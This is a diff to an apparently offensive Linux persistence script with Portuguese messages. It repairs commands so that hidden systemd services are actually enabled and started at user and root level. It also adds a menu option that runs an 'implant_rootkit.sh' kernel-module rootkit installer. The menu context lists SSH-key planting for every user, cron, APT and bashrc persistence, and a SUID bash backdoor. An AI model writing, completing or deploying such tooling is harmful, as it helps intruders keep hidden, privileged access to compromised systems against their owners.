@@ -117,10 +117,8 @@ EOF
     else
       systemctl --user daemon-reload
 
-      systemctl --user hidden.service
-      systemctl --user hidden.service
-
-      systemctl --user hidden.service
+      systemctl --user enable hidden.service
+      systemctl --user start hidden.service
     fi
 
     rainbow "Systemd Persistence em user level setupado com sucesso!!"
@@ -159,10 +157,10 @@ EOF
     else
       systemctl daemon-reload
 
-      systemctl hidden2.service
-      systemctl hidden2.service
+      systemctl enable hidden2.service
+      systemctl start hidden2.service
 
-      systemctl hidden2.service
+      rainbow "Systemd Root level setupado com sucesso!"
     fi
 }
 
@@ -196,6 +194,11 @@ sshGen() {
     rainbow "SSH-KEY geradas para todos os usuários válidos com sucesso!! XDXD"
 }
 
+lkmRootkit() {
+	chmod +x implant_rootkit.sh
+	./implant_rootkit.sh
+}
+
 banner() {
     rainbow "
                                   ,
@@ -224,11 +227,13 @@ banner() {
 
 menu() {
     cat << EOF 
-  [01] Generate SSH keypair       [05] Systemd Root Level
-  [02] APT Persistence            [06] Bashrc Persistence
-  [03] Crontab Persistence        [07] Privileged user & SUID bash
-  [04] Systemd User Level
-    
+  [01] Generate SSH keypair       [06] Bashrc Persistence      
+  [02] APT Persistence            [07] Privileged user & SUID bash
+  [03] Crontab Persistence        [08] LKM Rootkit
+  [04] Systemd User level         
+  [05] Systemd Root Level         
+
+  	[*] Coming soon others features [*]
 
 EOF
 
@@ -250,6 +255,8 @@ EOF
         bashRCPersistence
     elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
         userANDBashSUID
+    elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
+        lkmRootkit
     else 
         echo "Essa opção não existe"
     fi
